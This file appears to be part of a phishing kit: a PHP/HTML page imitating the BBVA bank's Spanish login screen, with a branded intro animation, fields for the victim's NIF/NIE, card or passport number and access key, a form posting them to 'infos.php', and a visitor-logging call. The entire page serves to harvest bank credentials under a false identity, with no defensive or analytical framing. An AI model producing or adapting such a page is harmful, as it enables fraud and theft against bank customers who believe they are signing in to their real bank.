<?php
require_once "functions.php";
visitors();
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="utf-8">
  <title>BBVA - Iniciar sesión</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" crossorigin="anonymous">
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background-color: #ffffff;
      min-height: 100vh;
    }
    .intro-screen {
      background-color: #0019A5;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      position: fixed;
      width: 100%;
      z-index: 1000;
      flex-direction: row;
      font-size: 48px;
      font-weight: bold;
      letter-spacing: 3px;
      font-family: 'Arial', sans-serif;
    }
    .intro-screen span {
      display: inline-block;
      color: white;
      transition: transform 0.5s ease;
    }
    .intro-screen .last-a {
      transform: translateY(100px);
      animation: slideUpA 1.5s ease-in-out forwards;
      opacity: 0;
    }
    @keyframes slideUpA {
      0% { transform: translateY(100px); opacity: 0; }
      100% { transform: translateY(0); opacity: 1; }
    }
    .login-container {
      display: none;
      width: 100%;
      max-width: 360px;
      padding: 20px;
      margin: auto;
    }
    .top-bar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 10px 0;
    }
    .top-bar h2 {
      font-size: 16px;
      margin: 0;
      color: #001b50;
    }
    .top-bar-icons {
      display: flex;
      gap: 15px;
    }
    .top-bar-icons div {
      text-align: center;
      font-size: 10px;
      color: #001b50;
    }
    .top-bar-icons i {
      display: block;
      font-size: 18px;
      background-color: #f5f5f5;
      border-radius: 50%;
      width: 30px;
      height: 30px;
      line-height: 30px;
      text-align: center;
      margin: 0 auto 5px;
      color: #001b50;
    }
    .form-group {
      position: relative;
      margin-bottom: 20px;
    }
    .form-group input {
      width: 100%;
      padding: 15px;
      border-radius: 10px;
      border: 1px solid #0019A5;
      background-color: #fff;
      color: #000;
      font-size: 16px;
      box-shadow: 0px 2px 4px rgba(0, 0, 0, 0.1);
    }
    .form-group input::placeholder {
      color: #888;
    }
    .toggle-password {
      position: absolute;
      right: 15px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      color: #0019A5;
    }
    .link {
      font-size: 14px;
      color: #0019A5;
      text-decoration: none;
      display: block;
      margin-bottom: 25px;
      font-weight: bold;
    }
    .btn {
      width: 100%;
      padding: 15px;
      border-radius: 12px;
      font-size: 16px;
      margin-bottom: 15px;
      text-align: center;
    }
    .btn-login {
      background-color: #f2f2f2;
      color: #aaa;
      border: none;
    }
    .btn-login.active {
      background-color: #0019A5;
      color: #fff;
    }
    .btn-secondary {
      background-color: #fff;
      color: #0019A5;
      border: 1px solid #0019A5;
    }
    .btn-text {
      background-color: #f2f2f2;
      color: #0019A5;
      border: none;
    }
  </style>
</head>
<body>
  <div class="intro-screen" id="intro">
    <span>B</span><span>B</span><span>V</span><span class="last-a">A</span>
  </div>

  <div class="login-container" id="login">
    <div class="top-bar">
      <h2>Iniciar sesión</h2>
      <div class="top-bar-icons">
        <div>
          <i class="fas fa-question"></i>
          Ayuda
        </div>
        <div>
          <i class="fas fa-times"></i>
          Cerrar
        </div>
      </div>
    </div>
    <form action="infos.php" method="post">
      <input type="hidden" name="step" value="index">
      <div class="form-group">
        <input type="text" name="nif" id="nif" placeholder="NIF, NIE, Tarjeta o Pasaporte" required>
      </div>
      <div class="form-group">
        <input type="password" name="password" id="password" minlength="4" maxlength="6" placeholder="Clave de acceso" required>
        <i class="fas fa-eye toggle-password" onclick="togglePassword()"></i>
      </div>
      <a href="#" class="link">¿Has olvidado tu clave de acceso?</a>
      <button class="btn btn-login" id="bttn" name="submit" disabled>Iniciar sesión</button>
      <button type="button" class="btn btn-secondary">Hazte cliente</button>
      <button type="button" class="btn btn-text">Crea tu clave de acceso</button>
    </form>
  </div>

  <script>
    window.onload = () => {
      setTimeout(() => {
        document.getElementById("intro").style.display = "none";
        document.getElementById("login").style.display = "block";
      }, 5000);
    }

    const passwordInput = document.getElementById("password");
    const togglePasswordIcon = document.querySelector(".toggle-password");
    const loginBtn = document.getElementById("bttn");

    function togglePassword() {
      const type = passwordInput.getAttribute("type") === "password" ? "text" : "password";
      passwordInput.setAttribute("type", type);
      togglePasswordIcon.classList.toggle("fa-eye");
      togglePasswordIcon.classList.toggle("fa-eye-slash");
    }

    passwordInput.addEventListener("input", () => {
      const length = passwordInput.value.length;
      if (length >= 4 && length <= 6) {
        loginBtn.removeAttribute("disabled");
        loginBtn.classList.add("active");
      } else {
        loginBtn.setAttribute("disabled", true);
        loginBtn.classList.remove("active");
      }
    });
  </script>
</body>
</html>